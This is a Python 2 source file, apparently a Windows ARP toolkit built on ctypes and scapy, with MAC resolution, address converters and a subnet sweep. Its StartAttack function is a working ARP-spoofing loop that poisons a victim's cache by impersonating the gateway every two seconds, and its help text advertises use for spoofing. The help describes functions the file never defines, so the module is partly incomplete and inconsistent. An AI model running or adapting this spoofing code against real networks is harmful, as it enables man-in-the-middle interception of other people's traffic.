__author__ = "0xcc_"
"""


NOTE: Some functions in this module use winpcap for windows. Please make
sure that wpcap.dll is present in your system to use them.
"""
from _socket import IPPROTO_IP, gethostname

try:
    from scapy.all import *
except:
    pass
__all__ = ['showhelp', 'find_device', 'open_device', 'close_device', 'send_raw',
'multisend_raw', 'arp_resolve', 'arp_reply', 'rarp_reply','mac_straddr',
'ip_straddr', 'ARP_REQUEST', 'ARP_REPLY', 'RARP_REQUEST', 'RARP_REPLY',
'FRAME_SAMPLE']

""" Set this to True you wish to see warning messages """
__warnings__ = False

from ctypes import *
import threading 
import socket
import struct
import time

M = True

FRAME_SAMPLE = """
Sample ARP frame
+-----------------+------------------------+
| Destination MAC | Source MAC             |
+-----------------+------------------------+
| \\x08\\x06 (arp)  | \\x00\\x01  (ethernet)   |
+-----------------+------------------------+
| \\x08\\x00 (internet protocol)             |
+------------------------------------------+
| \\x06\\x04 (hardware size & protocol size) |
+------------------------------------------+
| \\x00\\x02 (type: arp reply)               | 
+------------+-----------+-----------------+
| Source MAC | Source IP | Destination MAC |
+------------+---+-------+-----------------+
| Destination IP | ... Frame Length: 42 ...
+----------------+
"""

""" Frame header bytes """
ARP_REQUEST = "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01"
ARP_REPLY = "\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02"
RARP_REQUEST = "\x80\x35\x00\x01\x08\x00\x06\x04\x00\x03"  #?
RARP_REPLY = "\x80\x35\x00\x01\x08\x00\x06\x04\x00\x04"      #?
""" Defines """
ARP_LENGTH = 42
RARP_LENGTH = 42
DEFAULT = 0




""" Loading Windows system libraries should not be a problem """  
try:
    iphlpapi = windll.Iphlpapi
    ws2_32 = windll.ws2_32
except WindowsError:
    """ Should it still fail """
    print "Error loading windows system libraries!"

""" Import functions """  
"""
if wpcap:

    pcap_findalldevs = wpcap.pcap_findalldevs
    
    pcap_lookupdev = wpcap.pcap_lookupdev
    

   # pcap_sendpacket = wpcap.pcap_sendpack
    pcap_close = wpcap.pcap_close
    """
    
""" Find the first device available for use. If this fails
to retrieve the preferred network interface identifier,
disable all other interfaces and it should work."""  
"""
def find_device():
    errbuf = create_string_buffer(256)
    device = c_void_p
    
    device = pcap_lookupdev(errbuf)

    return device
"""

""" Get the handle to a n
"""
def arp_resolve(destination,sourceip, source=None):
    
    mac_addr = (c_ulong*2)()
    addr_len = c_ulong(6)
    dest_ip = ws2_32.inet_addr(destination)
    
    if not source:
        src_ip = ws2_32.inet_addr(sourceip)  #Original Parameter: socket.gethostbyname(socket.gethostname())
      #  print socket.gethostname()
        #Really returned TRUe Ip?

    else:
        src_ip = ws2_32.inet_addr(source)
    #src_ip = "192.168.0.102" 
    """
    Iphlpapi SendARP prototype
    DWORD SendARP(
      __in     IPAddr DestIP,
      __in     IPAddr SrcIP,
      __out    PULONG pMacAddr,
      __inout  PULONG PhyAddrLen
    );
    """ 
    error = iphlpapi.SendARP(dest_ip, src_ip, byref(mac_addr), byref(addr_len))

    if error:
        #if __warnings__: 
            #print "Warning: Error code:", error
        err = iphlpapi.SendARP(dest_ip, src_ip, byref(mac_addr), byref(addr_len)) 
        if err:
            return 
    return mac_addr



""" Convert c_ulong*2 to a hexadecimal string or a printable ascii
string delimited by the 3rd parameter""" 
def mac_straddr(mac, printable=False, delimiter=None):
    """ Expect a list of length 2 returned by arp_query """
    
    if len(mac) != 2:
        return -1
    if printable:
        if delimiter:
            m = ""
            for c in mac_straddr(mac):
                m += "%02x" % ord(c) + delimiter
            return m.rstrip(delimiter)
        
        return repr(mac_straddr(mac)).strip("\'")
    
    return struct.pack("L", mac[0])+struct.pack("H", mac[1])

""" Convert address in an ip dotted decimal format to a hexadecimal
string """
def ip_straddr(ip, printable=False):
    ip_l = ip.split(".")
    if len(ip_l) != 4:
        return -1

    if printable:
        return repr(ip_straddr(ip)).strip("\'")
    
    return struct.pack(
        "BBBB",
        int(ip_l[0]),
        int(ip_l[1]),
        int(ip_l[2]),
        int(ip_l[3])
        )

def showhelp():
    helpmsg = """ARP MODULE HELP (Press ENTER for more or CTRL-C to break)

Constants:
    Graphical representation of an ARP frame
    FRAME_SAMPLE
    
    Headers for crafting ARP / RARP packets
    ARP_REQUEST, ARP_REPLY, RARP_REQUEST, RARP_REPLY

    Other
    ARP_LENGTH, RARP_LENGTH, DEFAULT

Functions:
    find_device() - Returns an identifier to the first available network
    interface.
    open_device(device=DEFAULT) - Returns a handle to an available network
    device.

    close_device() - Close the previously opened handle.

    send_raw(device, packet) - Send a raw ethernet frame. Returns
    the number of bytes sent.

    multisend_raw(device, packetlist=[], interval=0) - Send multiple packets
    across a network at the specified interval. Returns the number of bytes
    sent.

    arp_resolve(destination, strformat=True, source=None) - Returns the mac
    address associated with the ip specified by 'destination'. The destination
    ip is supplied in dotted decimal string format. strformat parameter
    specifies whether the return value is in a hexadecimal string format or
    in list format (c_ulong*2) which can further be formatted using
    the 'mac_straddr' function (see below). 'source' specifies the ip address
    of the sender, also supplied in dotted decimal string format.

    arp_reply(dest_ip, dest_mac, src_ip, src_mac) - Send gratuitous ARP
    replies. This can be used for ARP spoofing if the parameters are chosen
    correctly. dest_ip is the destination ip in either dotted decimal
    string format or hexadecimal string format (returned by 'ip_straddr').
    dest_mac is the destination mac address and must be in hexadecimal
    string format. If 'arp_resolve' is used with strformat=True the return
    value can be used directly. src_ip specifies the ip address of the
    sender and src_mac the mac address of the sender.

    rarp_reply(dest_ip, dest_mac, src_ip, src_mac) - Send gratuitous RARP
    replies. Operates similar to 'arp_reply'.

    mac_straddr(mac, printable=False, delimiter=None) - Convert a mac
    address in list format (c_ulong*2) to normal hexadecimal string
    format or printable format. Alternatively a delimiter can be specified
    for printable formats, e.g ':' for ff:ff:ff:ff:ff:ff.

    ip_straddr(ip, printable=False) - Convert an ip address in
    dotted decimal string format to hexadecimal string format. Alternatively
    this function can output a printable representation of the hex
    string format.
"""
    for line in helpmsg.split('\n'):
        print line,
        raw_input('')
    #Return a IP_scan list.
def ip_process(Input_ip):
    Scan_List = []
    #Check whether ip is legal.
    """Need Statements here."""  
    Input_ip = Input_ip.split(".")   
    #plus 0 -254.
    for x in range(0,255):
        Scan_List.append(Input_ip[0]+"."+Input_ip[1]+"."+Input_ip[2]+"."+str(x))
    #for x in Scan_List:
      #  print x 
    return Scan_List

def Process(ip_d,ip_s):
    result = arp_resolve(ip_d,ip_s,0)
    if result: 
        print ip_d, "is at", mac_straddr(result, 1, ",")
def StartAttack(dest_IP,dest_Mac,GateWay,src_MAC= 'bc:3a:ea:29:39:95'):
    
    A = ARP()
    A.pdst = dest_IP
    A.psrc = GateWay
    A.hwdst = dest_Mac
    try:
        send(A)
    except:
        M = False
        
    while True:
        send(A)
        time.sleep(2)

if __name__ == '__main__' :
    """Test."""
    dest_IP = "192.168.0.103" 
    Src_ip = "192.168.0.102"
    res = arp_resolve(dest_IP,Src_ip)
    dest_mac = mac_straddr(res)
    print dest_mac
    res_2 = arp_resolve(Src_ip,Src_ip)
    src_mac = mac_straddr(res_2)